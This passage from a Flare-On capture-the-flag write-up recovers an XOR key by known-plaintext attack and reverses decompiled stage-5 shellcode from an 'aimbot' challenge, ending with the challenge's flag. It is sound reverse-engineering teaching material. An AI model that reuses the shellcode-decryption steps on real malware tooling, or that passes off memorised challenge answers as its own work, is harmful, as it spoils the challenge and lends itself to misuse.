                      /* ... */
```

Here, the next shellcode is decrypted using a repeated **4-byte** XOR key, which comes from
`bighackies.flare-on.com`. That is, we do not know the key.

However, we know the ciphertext and we also know the first **42** bytes of the plaintext 
(`the decryption of this blob was successful`), so we can do a **known plaintext attack**
to recover the key, which is `0x12345670`. Then we can recover the fifth and the last shellcode.

For more details, please refer to the [aimbot_shellcode_decryptor.py](./aimbot_shellcode_decryptor.py) script.


#### Reversing Stage #5 Shellcode

This is the last of shellcode of the challenge:
```c
void __fastcall __noreturn entry_point() {
  __int64 v0; // [rsp-20h] [rbp-20h] BYREF

  (u_decrypt_string)(&dword_D1E, &v0);
  u_decrypt_n_run_shellcode();
}
```

```c
void __fastcall __noreturn u_decrypt_n_run_shellcode() {
  /* ... */
  modHdl = (qword_CD6[3])(0i64);                // GetModuleHandleA
  LOBYTE(v1) = u_memcmp(modHdl + 0x2A58C0, "spcr", 4ui64);
  if ( !v1 ) {
    if ( modHdl[0x2A58C4] ) {
      u_sprintf(fmt, "%%PROGRAMFILES(X86)%%\\Sauerbraten\\packages\\base\\%s.cfg", v2);
      (qword_CD6[7])(fmt, filename, 1024i64);
      hdl = u_OpenFile(filename, 0x80000000);
      hdl_ = hdl;
      if ( hdl >= 0 && u_ReadFile(hdl, &pt4, 4i64) == 4 ) { // 'maps' (from mapsound)
        sub_6CE(hdl_, 0x51i64, 0);                  // move file ptr?
        if ( u_ReadFile(hdl_, flag, 8i64) == 8 ) {  // 'computer'
          u_CloseHandle(hdl_);
          flag[8] = modHdl[0x30EE];
          flag[9] = 0;
          v5 = *(modHdl + 0x54AE6);
          if ( *(v5 + 0x238) == 1337 ) {
            pt5 = pt4 ^ 0x4203120C;
            flag[9] = pt4 ^ 0xC;
            flag[10] = ((pt4 ^ 0x120C) & 0xFF00) >> 8;
            flag[11] = ((pt4 ^ 0x4203120C) & 0xFF0000u) >> 16;
            flag[12] = ((pt4 ^ 0x4203120C) & 0xFF000000) >> 24;
            flag[13] = 0;
            if ( *(v5 + 0x248) == 1337 ) {
              pt5 = pt4 ^ 0x1715151E;
              qmemcpy(&flag[13], &pt5, 4ui64);
              flag[17] = 0;
              if ( *(modHdl + 0xA95DF) <= 30000 ) {
                pt5 = pt4 ^ 0x15040232;
                qmemcpy(&flag[17], &pt5, 4ui64);
                flag[21] = 0;
                if ( !*(modHdl + 0xA96B6) ) {
                  pt6 = *(modHdl + 0x8A514) ^ 0x32061E1A;
                  qmemcpy(&flag[21], &pt6, 4ui64);
                  flag[25] = 0;
                  if ( u_crc32(flag, 25ui64) == 0xA5561586 ) {
                    msg = u_alloc(128i64);
                    u_strcpy(msg, "The flag is: ");
                    u_strcat(msg, flag);
                    u_strcat(msg, "flare-on.com");
                    qword_CD6[2](0i64);
                    /* ... */
```

This time shellcode reads the first 4 bytes of Sauerbraten's `spcr2.cfg` and performs various
XOR operations to get the flag. It also uses **4** bytes from the `sauerbraten.exe` binary which we 
also do not know. To verify that the flag is correct, shellcode checks if the CRC32 is `A5561586h`.

Since we know its CRC32, we can easily brute force the remaining **4** characters.

For more details, please refer to the [aimbot_crack.py](./aimbot_crack.py) script.

So the flag is: `computer_ass1sted_ctfing@flare-on.com`

___
